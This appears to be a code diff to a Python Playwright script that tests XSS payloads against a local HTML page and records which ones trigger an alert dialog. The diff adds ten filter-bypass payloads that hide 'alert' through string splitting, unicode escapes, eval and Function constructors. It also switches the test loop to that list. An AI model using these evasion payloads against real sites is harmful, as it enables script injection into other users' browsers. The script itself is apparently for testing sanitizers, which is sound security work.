@@ -14,12 +14,25 @@ payloads = [
     "<select><option></option></select><img src=x onerror=alert('XSS')>"
 ]
 
+bypass_payloads = [
+    "<svg/onload=setTimeout('ale'+'rt(1)',100)>",
+    "<iframe src=\"javascript: setTimeout('ale'+'rt(1)', 100)\"></iframe>",
+    "<details open ontoggle=\"setTimeout(unescape('%61%6c%65%72%74(1)'), 100)\">",
+    "<input onfocus=(()=>{setTimeout(()=>{alert?.(1)},100)})() autofocus>",
+    "<img src=x onerror=((x)=>{['al','ert'][0]+='';eval(x)})(`alert(1)`)>",
+    "<select><option></option></select><img src=x onerror=[].filter.constructor('ale'+'rt(1)')()>",
+    "<math><mtext><script>setInterval`alert\\u00281\\u0029`</script></mtext></math>",
+    "<video><source onerror=Function(\"alert(1)\")()>",
+    "<marquee onstart=eval`al\\u0065rt(1)`>",
+    "<script>new Function`aler\\u0074(1)`()</script>"
+]
+
+
 async def test_payload(playwright, file_path: str, payload: str) -> bool:
     browser = await playwright.chromium.launch(headless=True)
     context = await browser.new_context()
 
     async def on_dialog(dialog):
-        print(f"[!] Alert triggered: {dialog.message}")
         await dialog.dismiss()
         context.alert_triggered = True
 
@@ -41,13 +54,15 @@ async def main():
 
     async with async_playwright() as playwright:
         print("=== 開始測試 Payloads ===")
-        for i, payload in enumerate(payloads):
+        for i, payload in enumerate(bypass_payloads):
             try:
                 result = await test_payload(playwright, html_path, payload)
-                status = "Triggered" if result else "Not Triggered"
-                print(f"[{i+1}] {status} | {payload}")
+                # status = "Triggered" if result else "Not Triggered"
+                # print(f"[{i+1}] {status} | {payload}")
+                if result:
+                    print(f"[{i}] Triggered | {payload}")
             except Exception as e:
-                print(f"[{i+1}] Error: {e} | Payload: {payload}")
+                print(f"[{i}] Error! | Payload: {payload}")
 
 if __name__ == "__main__":
     asyncio.run(main())
